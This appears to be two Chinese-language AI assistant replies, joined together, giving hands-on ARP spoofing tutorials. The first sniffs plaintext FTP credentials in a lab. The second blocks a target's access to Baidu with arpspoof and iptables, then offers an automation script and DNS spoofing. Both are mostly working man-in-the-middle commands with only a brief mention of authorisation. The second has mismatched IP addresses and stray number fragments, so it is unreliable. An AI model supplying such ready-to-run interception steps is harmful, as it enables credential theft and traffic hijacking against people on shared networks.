非常好，你已经设定了一个典型的三机局域网环境，用来演示 **FTP明文传输+ARP欺骗劫持**。下面我将为你提供一个**完整的实验方案**，包括：

------

## 🧱 实验环境拓扑

```
+-----------+        +-----------+        +-----------+
|  客户端 A |<----->|   交换机   |<----->| FTP 服务器 C |
| 192.168.1.130      |            |       192.168.1.129 |
+-----------+        +-----------+        +-----------+
       ↑
       |
       |
+-----------+
| Kali 攻击者 |
|192.168.1.128|
+-----------+
```

------

## 🛠️ 一、准备工作

### 1. FTP服务器（C）配置

在192.168.1.129上安装FTP服务（如Windows可用FileZilla Server，Linux可用vsftpd）：

Linux上（如Ubuntu）：

```bash
sudo apt update
sudo apt install vsftpd -y
sudo systemctl start vsftpd
```

创建测试用户：

```bash
sudo useradd ftpuser
sudo passwd ftpuser
```

设置好匿名/明文登录或启用本地用户登录。

------

### 2. 客户端（A）配置

- 可使用 **FileZilla 客户端** 或 Windows 的 `ftp` 命令
- 验证从客户端登录FTP是否正常：

```bash
ftp 192.168.1.129
```

------

### 3. Kali 攻击者（192.168.1.128）

工具：`arpspoof`, `tcpdump` 或 `wireshark`

------

## 🎯 二、攻击步骤

### 第一步：启用IP转发（Kali）

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### 第二步：ARP欺骗（双向）

欺骗A（客户端），让它以为服务器C的MAC是你：

```bash
arpspoof -i eth0 -t 192.168.1.130 192.168.1.129
```

欺骗C（FTP服务器），让它以为客户端A的MAC是你：

```bash
arpspoof -i eth0 -t 192.168.1.129 192.168.1.130
```

（`eth0` 视你Kali网卡名而定，可用 `ip a` 查看）

------

### 第三步：抓包FTP明文凭证

```bash
tcpdump -i eth0 port 21 -A
```

或者使用 Wireshark：

- 设置过滤器为：`ftp` 或 `tcp.port == 21`
- 找到含 `USER` 和 `PASS` 的数据包

你会看到类似：

```
USER ftpuser
PASS 123456
```

说明已成功抓取明文用户名密码。

------

## ✅ 三、实验验证成功的标志

- 客户端和服务器依然可以正常通信（因为你开启了转发）
- 攻击者成功在抓包中看到 FTP 的用户名密码明文

------

## 🔒 安全建议（课后拓展）

- 不要使用FTP等明文协议，改用 `SFTP` 或 `FTPS`
- 使用静态ARP绑定防止ARP欺骗
- 配置交换机端口隔离或使用防ARP欺骗功能（如D-Link、TP-Link企业交换机支持）

------







好的，下面给你一份 **基于 Kali 的 ARP 欺骗（MITM）+ 拦截百度访问的完整实战教程**，步骤详细且易懂。

------

# Kali ARP 欺骗让目标上不了百度的完整教程

------

## 0. 环境假设

- Kali IP：`172.22.12.100`
- 目标主机 IP：`172.22.12.51`
- 网关 IP：`172.22.31.254`
- 网络接口：`eth0`（你用 `ip a` 确认）

------

## 1. 启用 IP 转发

中间人要充当路由器，必须转发数据包：

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

------

## 2. 设置 NAT（伪装源 IP，让流量能出去）

```bash
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

------

## 3. 启动 ARP 欺骗（双向）

打开两个终端，分别执行：		11.242

### 终端1（欺骗目标主机，告诉它“我是网关”）：

```bash
sudo arpspoof -i eth0 -t 172.22.12.18 172.22.31.254
```

### 终端2（欺骗网关，告诉它“我是目标主机”）：

```bash
sudo arpspoof -i eth0 -t 172.22.31.254 172.22.1.182
```

------

## 4. 验证 ARP 欺骗成功

目标主机上执行：

```bash
arp -a
```

看到网关 IP 对应的 MAC 地址变成了 Kali 机器的 MAC，说明欺骗成功。

------

## 5. 获取百度的 IP 地址（用于拦截）

在 Kali 上执行：

```bash
dig +short www.baidu.com
```

假设返回几个 IP，比如：

```
153.3.238.127
153.3.238.28

```

------

## 6. 拦截目标访问百度 IP

把目标访问百度的流量丢弃，禁止访问：1.182

```bash
for ip in 153.3.238.127 153.3.238.28 ; do
    sudo iptables -A FORWARD -s 172.22.12.51 -d $ip -j DROP
done
```

------

## 7. 测试

- 目标机器尝试访问百度，网页打不开或超时。
- 访问其他网站正常。

------

## 8. 攻击结束，恢复网络

停止 ARP 欺骗（终端 Ctrl+C），然后在 Kali 上执行：

```bash
# 关闭 IP 转发
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# 清空 iptables 规则
sudo iptables -F
sudo iptables -t nat -F
```

------

# 额外说明

- **为什么要 IP 转发和 NAT？**
   ARP 欺骗让目标把数据发给你，但你需要帮它把数据转发出去，否则就是断网。
- **如果想更隐蔽，考虑 DNS 欺骗（可另行说明）**
- **注意安全和法律风险，只在授权网络做测试**

------

如果你需要，我可以帮你写一份脚本自动完成这些步骤，或者给出 DNS 欺骗的详细流程。需要吗？